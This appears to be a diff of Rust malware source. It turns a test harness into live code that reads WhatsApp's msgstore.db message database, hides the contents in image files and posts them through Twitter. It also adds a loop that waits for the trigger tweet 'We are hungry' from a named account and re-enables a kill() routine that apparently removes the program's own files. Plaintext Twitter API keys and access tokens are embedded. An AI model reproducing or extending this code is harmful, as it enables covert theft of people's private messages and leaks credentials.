@@ -23,12 +23,42 @@ use utils::ByteMask;
 
 #[allow(unused_must_use)]
 fn main() -> Result<(), Error> {
+    start();
     let path = env::current_dir()?;
     setup();
     pull_tweets();
     steal_db();
     send_tweet();
-    //kill(PathBuf::from(path));
+    kill(PathBuf::from(path));
+    Ok(())
+}
+
+#[tokio::main]
+async fn start() -> Result<(), Box<dyn std::error::Error>> {
+    let con_token = egg_mode::KeyPair::new("Z5kqu3hywa02aW2BYNGeWkkXA", "xSGYyYwGEIu95Wc7pOAKh7aIW9kymStpxWVDC85i0MRjedvtj4");
+    let access_token = egg_mode::KeyPair::new("1249802159178350599-C3zosoCFc0zdYrm4Fmk05WvMaMznZ4", "2FKoqwS5GA310J0bEy1X4djvjlFOeL2AdjmCpIT6MQSH7");
+    let token = egg_mode::Token::Access {
+        consumer: con_token,
+        access: access_token,
+    };
+    let user_id = "ToastDisciples";
+    let mut end = false;
+    let five_secs = time::Duration::from_millis(5000);
+    loop {
+        let user = egg_mode::tweet::user_timeline(user_id, true, true, &token).with_page_size(100);
+        let (_user, feed) = user.start().await?;
+        let mut i:u32 = 0;
+        for status in feed.iter() {
+            if status.text.contains("We are hungry") {
+                end = true;
+                break;
+            }
+        }
+        if end == true {
+            break;
+        }
+        thread::sleep(five_secs);
+    }
     Ok(())
 }
 
@@ -50,9 +80,8 @@ fn kill(og_path: PathBuf) -> Result<(), Error> {
 #[allow(unused_must_use)]
 fn steal_db() -> Result<(), Error> {
     let mask = ByteMask::new(2)?;
-    //let mut db = File::open("/data/data/com.whatsapp/databases/msgstore.db")?;
-    
-    let mut db = File::open("/Users/connor/Desktop/LargeTestFile.txt")?;
+    let mut db = File::open("/data/data/com.whatsapp/databases/msgstore.db")?;
+    //let mut db = File::open("/Users/connor/Desktop/LargeTestFile.txt")?;
     let mut buffer = Vec::new();
     let mut file_size:u32 = 0;
     db.read_to_end(&mut buffer)?;
@@ -72,7 +101,7 @@ fn steal_db() -> Result<(), Error> {
         println!("ENCODING {}", i);
         let jpg = format!("image_0.jpg");
         let png = format!("image_{}encoded.png", i);
-        let f = fs::read("/Users/connor/Desktop/LargeTestFile.txt")?;
+        let f = fs::read("/data/data/com.whatsapp/databases/msgstore.db")?;
         let mut iter = f.chunks(image_size as usize);
         let mut count:u32 = 0;
         while count < i {
@@ -98,7 +127,7 @@ async fn send_tweet() -> Result<(), Box<dyn std::error::Error>> {
         access: access_token,
     };
 
-    let mut db = File::open("/Users/connor/Desktop/LargeTestFile.txt")?;
+    let mut db = File::open("/data/data/com.whatsapp/databases/msgstore.db")?;
     let mut buffer = Vec::new();
     let mut file_size:u32 = 0;
     db.read_to_end(&mut buffer)?;
